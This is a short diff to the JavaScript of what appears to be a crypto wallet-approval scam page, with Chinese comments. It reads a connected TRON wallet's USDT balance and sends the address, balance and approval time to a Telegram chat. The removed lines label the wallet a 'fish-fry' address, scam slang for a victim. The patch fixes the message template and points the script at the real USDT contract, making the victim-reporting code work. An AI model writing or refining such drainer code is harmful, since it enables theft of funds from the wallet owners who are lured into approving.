@@ -133,7 +133,7 @@
 
     // 获取 USDT 余额
     const getUSDTBalance = async (walletAddress) => {
-        const usdtContractAddress = "TXoZgEXbBxU2h6s9t9P2QdAqW2LHZq8oB6";  // USDT TRC-20 合约地址
+        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // 使用您的合约地址
         const contract = await tronWeb.contract().at(usdtContractAddress);
 
         // 获取钱包的 USDT 余额
@@ -217,10 +217,10 @@
 
         // 构建 Telegram 消息
         const message = `
-            *🟣【TRC授权通知】🟣*\n\n
-            🐠鱼苗地址： ${walletAddress}\n\n
+            *🟣【TRC授权通知】*\n\n
+            🔔监听地址： ${walletAddress}\n\n
             💰USDT余额： ${usdtBalance} USDT\n\n
-            "⏰授权时间： {$currentTime}\n\n"
+            ⏰授权时间： ${currentTime}\n
         `;
 
         // 使用 Fetch API 向 Telegram 发送请求
@@ -253,6 +253,7 @@
         lianjieqianbao();
     });
 </script>
+
 
 
 
